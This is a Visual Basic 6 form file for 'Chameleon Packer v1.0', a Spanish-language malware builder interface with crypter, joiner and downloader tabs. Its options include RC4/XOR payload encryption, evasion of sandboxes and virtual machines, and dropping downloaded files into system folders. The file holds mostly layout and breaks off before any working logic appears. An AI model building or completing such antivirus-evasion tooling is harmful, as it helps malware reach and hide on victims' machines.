VERSION 5.00
Object = "{831FDD16-0C5C-11D2-A9FC-0000F8754DA1}#2.0#0"; "MsComCtl.ocx"
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "COMDLG32.OCX"
Begin VB.Form Form1 
   BackColor       =   &H00FFFFFF&
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Chameleon Packer v1.0"
   ClientHeight    =   7275
   ClientLeft      =   4785
   ClientTop       =   2940
   ClientWidth     =   5535
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   7275
   ScaleWidth      =   5535
   Begin MSComDlg.CommonDialog CD 
      Left            =   5040
      Top             =   0
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin VB.Frame Frame4 
      BackColor       =   &H00FFFFFF&
      Height          =   2295
      Left            =   120
      TabIndex        =   7
      Top             =   0
      Width           =   5295
      Begin VB.Image Image1 
         Height          =   2130
         Left            =   360
         Picture         =   "Form1.frx":0000
         Top             =   120
         Width           =   4500
      End
   End
   Begin VB.Frame Frame3 
      BackColor       =   &H00FFFFFF&
      Height          =   735
      Left            =   120
      TabIndex        =   2
      Top             =   2280
      Width           =   5295
      Begin Proyecto1.Button Button1 
         Height          =   375
         Left            =   120
         TabIndex        =   3
         Top             =   240
         Width           =   1335
         _ExtentX        =   2355
         _ExtentY        =   661
         ButtonStyle     =   4
         BackColor       =   16777215
         BackColorPressed=   16777215
         BackColorHover  =   16777215
         BorderColor     =   -2147483632
         BorderColorPressed=   -2147483632
         BorderColorHover=   -2147483632
         ForeColorHover  =   255
         Caption         =   "Crypter"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   9.75
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
      End
      Begin Proyecto1.Button Button2 
         Height          =   375
         Left            =   1440
         TabIndex        =   4
         Top             =   240
         Width           =   1215
         _ExtentX        =   2143
         _ExtentY        =   661
         ButtonStyle     =   4
         BorderColor     =   -2147483632
         BorderColorPressed=   -2147483632
         BorderColorHover=   -2147483632
         ForeColorHover  =   255
         Caption         =   "Joiner"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   9.75
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
      End
      Begin Proyecto1.Button Button3 
         Height          =   375
         Left            =   2640
         TabIndex        =   5
         Top             =   240
         Width           =   1335
         _ExtentX        =   2355
         _ExtentY        =   661
         ButtonStyle     =   4
         BorderColor     =   -2147483632
         BorderColorPressed=   -2147483632
         BorderColorHover=   -2147483632
         ForeColorHover  =   255
         Caption         =   "Downloader"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   9.75
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
      End
      Begin Proyecto1.Button Button4 
         Height          =   375
         Left            =   3960
         TabIndex        =   6
         Top             =   240
         Width           =   1215
         _ExtentX        =   2143
         _ExtentY        =   661
         ButtonStyle     =   4
         BorderColor     =   -2147483632
         BorderColorPressed=   -2147483632
         BorderColorHover=   -2147483632
         ForeColorHover  =   255
         Caption         =   "About..."
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   9.75
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
      End
   End
   Begin VB.Frame Frame2 
      BackColor       =   &H00FFFFFF&
      Caption         =   "Función"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   4215
      Left            =   2160
      TabIndex        =   1
      Top             =   3000
      Width           =   3255
      Begin VB.PictureBox Picture4 
         BackColor       =   &H00FFFFFF&
         BorderStyle     =   0  'None
         Height          =   3855
         Left            =   120
         ScaleHeight     =   3855
         ScaleWidth      =   3015
         TabIndex        =   49
         Top             =   240
         Width           =   3015
         Begin VB.TextBox Text3 
            Appearance      =   0  'Flat
            BorderStyle     =   0  'None
            Height          =   255
            Left            =   0
            TabIndex        =   52
            Text            =   " in honor to him."
            Top             =   3480
            Width           =   3015
         End
         Begin VB.TextBox Text2 
            Appearance      =   0  'Flat
            BorderStyle     =   0  'None
            Height          =   255
            Left            =   0
            TabIndex        =   51
            Text            =   " was take of the OwlDownloader by Xa0s "
            Top             =   3240
            Width           =   3015
         End
         Begin VB.TextBox Text1 
            Appearance      =   0  'Flat
            BorderStyle     =   0  'None
            Height          =   255
            Left            =   0
            TabIndex        =   50
            Text            =   " The Source code of the Downloader "
            Top             =   3000
            Width           =   2775
         End
         Begin VB.Label Label14 
            Alignment       =   2  'Center
            AutoSize        =   -1  'True
            BackColor       =   &H00FFFFFF&
            Caption         =   "Disclaimer:"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   9.75
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H000000FF&
            Height          =   240
            Left            =   960
            TabIndex        =   63
            Top             =   2760
            Width           =   1050
         End
         Begin VB.Label Label13 
            AutoSize        =   -1  'True
            BackColor       =   &H00FFFFFF&
            Caption         =   "Sanlegas for the Joiner"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   9.75
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   240
            Left            =   240
            TabIndex        =   62
            Top             =   2400
            Width           =   2250
         End
         Begin VB.Label Label12 
            AutoSize        =   -1  'True
            BackColor       =   &H00FFFFFF&
            Caption         =   "DARK_J4V13R, Xa0s, dSR"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   9.75
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   240
            Left            =   120
            TabIndex        =   61
            Top             =   2160
            Width           =   2475
         End
         Begin VB.Label Label11 
            Alignment       =   2  'Center
            AutoSize        =   -1  'True
            BackColor       =   &H00FFFFFF&
            Caption         =   "Greets to:"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   9.75
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   240
            Left            =   135
            TabIndex        =   60
            Top             =   1920
            Width           =   990
         End
         Begin VB.Label Label10 
            Alignment       =   2  'Center
            AutoSize        =   -1  'True
            BackColor       =   &H000000FF&
            Caption         =   "        "
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   9.75
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   135
            Left            =   1440
            TabIndex        =   59
            Top             =   1680
            Width           =   720
         End
         Begin VB.Label Label9 
            Alignment       =   2  'Center
            AutoSize        =   -1  'True
            BackColor       =   &H00FF0000&
            Caption         =   "        "
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   9.75
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   135
            Left            =   1440
            TabIndex        =   58
            Top             =   1560
            Width           =   720
         End
         Begin VB.Label Label8 
            Alignment       =   2  'Center
            AutoSize        =   -1  'True
            BackColor       =   &H0000FFFF&
            Caption         =   "        "
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   9.75
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   240
            Left            =   1425
            TabIndex        =   57
            Top             =   1320
            Width           =   720
         End
         Begin VB.Label Label7 
            Alignment       =   2  'Center
            AutoSize        =   -1  'True
            BackColor       =   &H00FFFFFF&
            Caption         =   "Country:"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   9.75
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   240
            Left            =   120
            TabIndex        =   56
            Top             =   1440
            Width           =   870
         End
         Begin VB.Label Label6 
            Alignment       =   2  'Center
            AutoSize        =   -1  'True
            BackColor       =   &H00FFFFFF&
            Caption         =   "To:  Indetectables.Net"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   9.75
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   240
            Left            =   120
            TabIndex        =   55
            Top             =   960
            Width           =   2160
         End
         Begin VB.Label Label5 
            Alignment       =   2  'Center
            AutoSize        =   -1  'True
            BackColor       =   &H00FFFFFF&
            Caption         =   "Coded By: WHITE-R00T"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   9.75
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   240
            Left            =   120
            TabIndex        =   54
            Top             =   720
            Width           =   2220
         End
         Begin VB.Label Label4 
            Alignment       =   2  'Center
            AutoSize        =   -1  'True
            BackColor       =   &H00FFFFFF&
            Caption         =   "About this..."
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   9.75
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   240
            Left            =   840
            TabIndex        =   53
            Top             =   120
            Width           =   1200
         End
      End
      Begin VB.PictureBox Picture3 
         Appearance      =   0  'Flat
         BackColor       =   &H80000005&
         BorderStyle     =   0  'None
         ForeColor       =   &H80000008&
         Height          =   3615
         Left            =   120
         ScaleHeight     =   3615
         ScaleWidth      =   3015
         TabIndex        =   36
         Top             =   240
         Width           =   3015
         Begin VB.Frame Frame8 
            BackColor       =   &H00FFFFFF&
            Caption         =   "Descargar en:"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   1215
            Left            =   0
            TabIndex        =   40
            Top             =   1920
            Width           =   3015
            Begin VB.OptionButton optWindir 
               Caption         =   "%WinDir%"
               BeginProperty Font 
                  Name            =   "Tahoma"
                  Size            =   8.25
                  Charset         =   0
                  Weight          =   400
                  Underline       =   0   'False
                  Italic          =   0   'False
                  Strikethrough   =   0   'False
               EndProperty
               Height          =   195
               Left            =   120
               TabIndex        =   44
               Top             =   360
               Width           =   1095
            End
            Begin VB.OptionButton optSystem32 
               Caption         =   "%System32%"
               BeginProperty Font 
                  Name            =   "Tahoma"
                  Size            =   8.25
                  Charset         =   0
                  Weight          =   400
                  Underline       =   0   'False
                  Italic          =   0   'False
                  Strikethrough   =   0   'False
               EndProperty
               Height          =   195
               Left            =   1320
               TabIndex        =   43
               Top             =   360
               Width           =   1335
            End
            Begin VB.OptionButton optSystem 
               Caption         =   "%System%"
               BeginProperty Font 
                  Name            =   "Tahoma"
                  Size            =   8.25
                  Charset         =   0
                  Weight          =   400
                  Underline       =   0   'False
                  Italic          =   0   'False
                  Strikethrough   =   0   'False
               EndProperty
               Height          =   195
               Left            =   120
               TabIndex        =   42
               Top             =   720
               Width           =   1215
            End
            Begin VB.OptionButton optApp 
               Caption         =   "%AppData%"
               BeginProperty Font 
                  Name            =   "Tahoma"
                  Size            =   8.25
                  Charset         =   0
                  Weight          =   400
                  Underline       =   0   'False
                  Italic          =   0   'False
                  Strikethrough   =   0   'False
               EndProperty
               Height          =   195
               Left            =   1320
               TabIndex        =   41
               Top             =   720
               Width           =   1335
            End
         End
         Begin VB.TextBox txtURL 
            Appearance      =   0  'Flat
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   9
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   285
            Left            =   0
            TabIndex        =   39
            Top             =   240
            Width           =   2895
         End
         Begin VB.TextBox txtRuta 
            Appearance      =   0  'Flat
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   9
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   285
            Left            =   0
            TabIndex        =   38
            Top             =   840
            Width           =   2895
         End
         Begin VB.TextBox txtNombre 
            Appearance      =   0  'Flat
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   9
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   285
            Left            =   0
            TabIndex        =   37
            Top             =   1440
            Width           =   2895
         End
         Begin Proyecto1.Button cmdDownloader 
            Height          =   375
            Left            =   720
            TabIndex        =   45
            Top             =   3240
            Width           =   1455
            _ExtentX        =   2566
            _ExtentY        =   661
            ButtonStyle     =   8
            BackColor       =   -2147483647
            BackColorPressed=   -2147483647
            BackColorHover  =   -2147483647
            BorderColor     =   -2147483647
            BorderColorPressed=   -2147483647
            BorderColorHover=   -2147483647
            ForeColor       =   16777215
            ForeColorPressed=   16777215
            ForeColorHover  =   16777215
            Caption         =   "Crear!"
            BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
         End
         Begin VB.Label lblUrl 
            Alignment       =   2  'Center
            BackColor       =   &H00FFFFFF&
            Caption         =   "URL a Descargar"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   9.75
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   255
            Left            =   720
            TabIndex        =   48
            Top             =   0
            Width           =   1695
         End
         Begin VB.Label lblRuta 
            Alignment       =   2  'Center
            BackColor       =   &H00FFFFFF&
            Caption         =   "Ruta para Guardar"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   9.75
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   255
            Left            =   600
            TabIndex        =   47
            Top             =   600
            Width           =   1935
         End
         Begin VB.Label lblNombre 
            Alignment       =   2  'Center
            BackColor       =   &H00FFFFFF&
            Caption         =   "Nombre de la App"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   9.75
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   255
            Left            =   480
            TabIndex        =   46
            Top             =   1200
            Width           =   1935
         End
      End
      Begin VB.PictureBox Picture2 
         Appearance      =   0  'Flat
         BackColor       =   &H80000005&
         ForeColor       =   &H80000008&
         Height          =   3615
         Left            =   120
         ScaleHeight     =   3585
         ScaleWidth      =   2985
         TabIndex        =   30
         Top             =   240
         Width           =   3015
         Begin MSComctlLib.ListView LV1 
            Height          =   3615
            Left            =   0
            TabIndex        =   35
            Top             =   0
            Width           =   3015
            _ExtentX        =   5318
            _ExtentY        =   6376
            View            =   3
            LabelWrap       =   -1  'True
            HideSelection   =   -1  'True
            GridLines       =   -1  'True
            _Version        =   393217
            ForeColor       =   -2147483640
            BackColor       =   -2147483643
            BorderStyle     =   1
            Appearance      =   0
            BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "Arial"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            NumItems        =   4
            BeginProperty ColumnHeader(1) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
               Text            =   "Nombre"
               Object.Width           =   2540
            EndProperty
            BeginProperty ColumnHeader(2) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
               SubItemIndex    =   1
               Text            =   "Ruta"
               Object.Width           =   2540
            EndProperty
            BeginProperty ColumnHeader(3) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
               SubItemIndex    =   2
               Text            =   "Extraer en:"
               Object.Width           =   2540
            EndProperty
            BeginProperty ColumnHeader(4) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
               SubItemIndex    =   3
               Text            =   "Ejecutar"
               Object.Width           =   2540
            EndProperty
         End
      End
      Begin VB.PictureBox Picture1 
         Appearance      =   0  'Flat
         BackColor       =   &H80000005&
         BorderStyle     =   0  'None
         ForeColor       =   &H80000008&
         Height          =   3615
         Left            =   120
         ScaleHeight     =   3615
         ScaleWidth      =   3015
         TabIndex        =   8
         Top             =   240
         Width           =   3015
         Begin VB.CheckBox chkEOF 
            Caption         =   "EOF Data?"
            Height          =   195
            Left            =   120
            TabIndex        =   29
            Top             =   3360
            Width           =   1095
         End
         Begin VB.Frame Frame7 
            Caption         =   "Algotritmo"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   495
            Left            =   120
            TabIndex        =   26
            Top             =   2760
            Width           =   1575
            Begin VB.OptionButton optXOR 
               Caption         =   "XOR"
               BeginProperty Font 
                  Name            =   "Tahoma"
                  Size            =   8.25
                  Charset         =   0
                  Weight          =   400
                  Underline       =   0   'False
                  Italic          =   0   'False
                  Strikethrough   =   0   'False
               EndProperty
               Height          =   195
               Left            =   720
               TabIndex        =   28
               Top             =   240
               Width           =   615
            End
            Begin VB.OptionButton optRC4 
               Caption         =   "RC4"
               BeginProperty Font 
                  Name            =   "Tahoma"
                  Size            =   8.25
                  Charset         =   0
                  Weight          =   400
                  Underline       =   0   'False
                  Italic          =   0   'False
                  Strikethrough   =   0   'False
               EndProperty
               Height          =   195
               Left            =   120
               TabIndex        =   27
               Top             =   240
               Value           =   -1  'True
               Width           =   615
            End
         End
         Begin VB.Frame Frame6 
            BackColor       =   &H00FFFFFF&
            Caption         =   "Anti-Debugging"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   1095
            Left            =   120
            TabIndex        =   16
            Top             =   1680
            Width           =   2775
            Begin VB.CheckBox Check8 
               Caption         =   "VirtualBox"
               BeginProperty Font 
                  Name            =   "Tahoma"
                  Size            =   8.25
                  Charset         =   0
                  Weight          =   400
                  Underline       =   0   'False
                  Italic          =   0   'False
                  Strikethrough   =   0   'False
               EndProperty
               Height          =   255
               Left            =   1320
               TabIndex        =   24
               Top             =   720
               Width           =   1095
            End
            Begin VB.CheckBox Check7 
               Caption         =   "VirtualPC"
               BeginProperty Font 
                  Name            =   "Tahoma"
                  Size            =   8.25
                  Charset         =   0
                  Weight          =   400
                  Underline       =   0   'False
                  Italic          =   0   'False
                  Strikethrough   =   0   'False
               EndProperty
               Height          =   255
               Left            =   240
               TabIndex        =   23
               Top             =   720
               Width           =   975
            End
            Begin VB.CheckBox Check6 
               Caption         =   "SBoxie"
               BeginProperty Font 
                  Name            =   "Tahoma"
                  Size            =   8.25
                  Charset         =   0
                  Weight          =   400
                  Underline       =   0   'False
                  Italic          =   0   'False
                  Strikethrough   =   0   'False
               EndProperty
               Height          =   255
               Left            =   1800
               TabIndex        =   22
               Top             =   480
               Width           =   855
            End
            Begin VB.CheckBox Check5 
               Caption         =   "CWSBox"
               BeginProperty Font 
                  Name            =   "Tahoma"
                  Size            =   8.25
                  Charset         =   0
                  Weight          =   400
                  Underline       =   0   'False
                  Italic          =   0   'False
                  Strikethrough   =   0   'False
               EndProperty
               Height          =   255
               Left            =   840
               TabIndex        =   21
               Top             =   480
               Width           =   975
            End
            Begin VB.CheckBox Check4 
               Caption         =   "VMW"
               BeginProperty Font 
                  Name            =   "Tahoma"
                  Size            =   8.25
                  Charset         =   0
                  Weight          =   400
                  Underline       =   0   'False
                  Italic          =   0   'False
                  Strikethrough   =   0   'False
               EndProperty
               Height          =   255
               Left            =   120
               TabIndex        =   20
               Top             =   480
               Width           =   735
            End
            Begin VB.CheckBox Check3 
               Caption         =   "Anubis"
               BeginProperty Font 
                  Name            =   "Tahoma"
                  Size            =   8.25
                  Charset         =   0
                  Weight          =   400
                  Underline       =   0   'False
                  Italic          =   0   'False
                  Strikethrough   =   0   'False
               EndProperty
               Height          =   255
               Left            =   1800
               TabIndex        =   19
               Top             =   240
               Width           =   855
            End
            Begin VB.CheckBox Check2 
               Caption         =   "T-Exprt"
               BeginProperty Font 
                  Name            =   "Tahoma"
                  Size            =   8.25
                  Charset         =   0
                  Weight          =   400
                  Underline       =   0   'False
                  Italic          =   0   'False
                  Strikethrough   =   0   'False
               EndProperty
               Height          =   255
               Left            =   840
               TabIndex        =   18
               Top             =   240
               Width           =   855
            End
            Begin VB.CheckBox Check1 
               Caption         =   "SBox"
               BeginProperty Font 
                  Name            =   "Tahoma"
                  Size            =   8.25
                  Charset         =   0
                  Weight          =   400
                  Underline       =   0   'False
                  Italic          =   0   'False
                  Strikethrough   =   0   'False
               EndProperty
               Height          =   255
               Left            =   120
               TabIndex        =   17
               Top             =   240
               Width           =   735
            End
         End
         Begin VB.Frame Frame5 
            BackColor       =   &H00FFFFFF&
            Caption         =   "Manejo de Archivos"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   1695
            Left            =   120
            TabIndex        =   9
            Top             =   0
            Width           =   2775
            Begin VB.TextBox txtKey 
               Appearance      =   0  'Flat
               BeginProperty Font 
                  Name            =   "Tahoma"
                  Size            =   8.25
                  Charset         =   0
                  Weight          =   400
                  Underline       =   0   'False
                  Italic          =   0   'False
                  Strikethrough   =   0   'False
               EndProperty
               Height          =   285
               Left            =   120
               TabIndex        =   13
               Top             =   1200
               Width           =   1815
            End
            Begin VB.TextBox txtFile 
               Appearance      =   0  'Flat
               BeginProperty Font 
                  Name            =   "Tahoma"
                  Size            =   8.25
                  Charset         =   0
                  Weight          =   400
                  Underline       =   0   'False
                  Italic          =   0   'False
                  Strikethrough   =   0   'False
               EndProperty
               Height          =   285
               Left            =   120
               TabIndex        =   11
               Top             =   600
               Width           =   1815
            End
            Begin Proyecto1.Button cmdBuscarC 
               Height          =   255
               Left            =   2040
               TabIndex        =   14
               Top             =   600
               Width           =   615
               _ExtentX        =   1085
               _ExtentY        =   450
               ButtonStyle     =   8
               BackColor       =   -2147483647
               BackColorPressed=   -2147483647
               BackColorHover  =   -2147483647
               BorderColor     =   -2147483647
               BorderColorPressed=   -2147483647
               BorderColorHover=   -2147483647
               ForeColor       =   16777215
               ForeColorPressed=   16777215
               ForeColorHover  =   16777215
               Caption         =   "..."
               BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
                  Name            =   "Tahoma"
                  Size            =   8.25
                  Charset         =   0
                  Weight          =   400
                  Underline       =   0   'False
                  Italic          =   0   'False
                  Strikethrough   =   0   'False
               EndProperty
            End
            Begin Proyecto1.Button cmdGenerar 
               Height          =   255
               Left            =   2040
               TabIndex        =   15
               Top             =   1200
               Width           =   615
               _ExtentX        =   1085
               _ExtentY        =   450
               ButtonStyle     =   8
               BackColor       =   -2147483647
               BackColorPressed=   -2147483647
               BackColorHover  =   -2147483647
               BorderColor     =   -2147483647
               BorderColorPressed=   -2147483647
               BorderColorHover=   -2147483647
               ForeColor       =   16777215
               ForeColorPressed=   16777215
               ForeColorHover  =   16777215
               Caption         =   "Rnd"
               BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
                  Name            =   "Tahoma"
                  Size            =   8.25
                  Charset         =   0
                  Weight          =   400
                  Underline       =   0   'False
                  Italic          =   0   'False
                  Strikethrough   =   0   'False
               EndProperty
            End
            Begin VB.Label Label2 
               Alignment       =   2  'Center
               BackColor       =   &H00FFFFFF&
               Caption         =   "KEY"
               BeginProperty Font 
                  Name            =   "Tahoma"
                  Size            =   8.25
                  Charset         =   0
                  Weight          =   700
                  Underline       =   0   'False
                  Italic          =   0   'False
                  Strikethrough   =   0   'False
               EndProperty
               Height          =   255
               Left            =   120
               TabIndex        =   12
               Top             =   960
               Width           =   375
            End
            Begin VB.Label Label1 
               Alignment       =   2  'Center
               BackColor       =   &H00FFFFFF&
               Caption         =   "Archivo"
               BeginProperty Font 
                  Name            =   "Tahoma"
                  Size            =   8.25
                  Charset         =   0
                  Weight          =   700
                  Underline       =   0   'False
                  Italic          =   0   'False
                  Strikethrough   =   0   'False
               EndProperty
               Height          =   255
               Left            =   120
               TabIndex        =   10
               Top             =   360
               Width           =   735
            End
         End
         Begin Proyecto1.Button cmdCrearC 
            Height          =   615
            Left            =   1800
            TabIndex        =   25
            Top             =   2880
            Width           =   1095
            _ExtentX        =   1931
            _ExtentY        =   1085
            ButtonStyle     =   8
            BackColor       =   -2147483647
            BackColorPressed=   -2147483647
            BackColorHover  =   -2147483647
            BorderColor     =   -2147483647
            BorderColorPressed=   -2147483647
            BorderColorHover=   -2147483647
            ForeColor       =   16777215
            ForeColorPressed=   16777215
            ForeColorHover  =   16777215
            Caption         =   "Encriptar!"
            BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
         End
      End
      Begin VB.Label Label3 
         Caption         =   "Label3"
         Height          =   3735
         Left            =   120
         TabIndex        =   34
         Top             =   240
         Width           =   3015
      End
   End
   Begin VB.Frame Frame1 
      BackColor       =   &H00FFFFFF&
      Caption         =   "Imágen"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   4215
      Left            =   120
      TabIndex        =   0
      Top             =   3000
      Width           =   2015
      Begin VB.Label lblDown 
         Alignment       =   2  'Center
         BackColor       =   &H00FFFFFF&
         Caption         =   "DESCARGAR"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   12
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   375
         Left            =   120
         TabIndex        =   33
         Top             =   480
         Width           =   1695
      End
      Begin VB.Label lblJoiner 
         Alignment       =   2  'Center
         BackColor       =   &H00FFFFFF&
         Caption         =   "JUNTAR"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   15.75
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   375
         Left            =   120
         TabIndex        =   32
         Top             =   480
         Width           =   1695
      End
      Begin VB.Label lblCrypter 
         BackColor       =   &H00FFFFFF&
         Caption         =   "PROTEGER"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   15.75
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   375
         Left            =   120
         TabIndex        =   31
         Top             =   480
         Width           =   1695
      End
      Begin VB.Image Image5 
         Height          =   2115
         Left            =   -120
         Picture         =   "Form1.frx":404D
         Top             =   1080
         Width           =   2250
      End
      Begin VB.Image Image4 
         Height          =   1815
         Left            =   -360
         Picture         =   "Form1.frx":5BBE
         Top             =   1200
         Width           =   2250
      End
      Begin VB.Image Image3 
         Height          =   1800
         Left            =   120
         Picture         =   "Form1.frx":783E
         Top             =   1200
         Visible         =   0   'False
         Width           =   1800
      End
      Begin VB.Image Image2 
         Height          =   2190
         Left            =   -120
         Picture         =   "Form1.frx":944F
         Top             =   960
         Width           =   2250
      End
   End
   Begin VB.Menu Menu 
      Caption         =   "MenuJoiner"
      Begin VB.Menu add 
         Caption         =   "Agregar"
      End
      Begin VB.Menu Del 
         Caption         =   "Eliminar"
      End
      Begin VB.Menu Clear 
         Caption         =   "Limpiar"
      End
      Begin VB.Menu separador1 
         Caption         =   "-"
      End
      Begin VB.Menu Extractin 
         Caption         =   "Extraer en"
         Begin VB.Menu AppData 
            Caption         =   "%AppData%"
         End
         Begin VB.Menu Temp 
            Caption         =   "%Temp%"
         End
         Begin VB.Menu WinDir 
            Caption         =   "%WinDir%"
         End
      End
      Begin VB.Menu Execute 
         Caption         =   "Ejecutar"
         Begin VB.Menu yes 
            Caption         =   "Si"
         End
         Begin VB.Menu No 
            Caption         =   "No"
         End
      End
      Begin VB.Menu sJoin 
         Caption         =   "Juntar"
      End
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'//-> CONSTANTES
Const a = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
Const B = "abcdefghijklmnopqrstuvwxyz"
Const C = "1234567890"

'======================================================================================
'//-> DISEÑO
'======================================================================================
Private Sub Button1_Click()
    Image2.Visible = True
    Image3.Visible = False
    Image4.Visible = False
    Image5.Visible = False
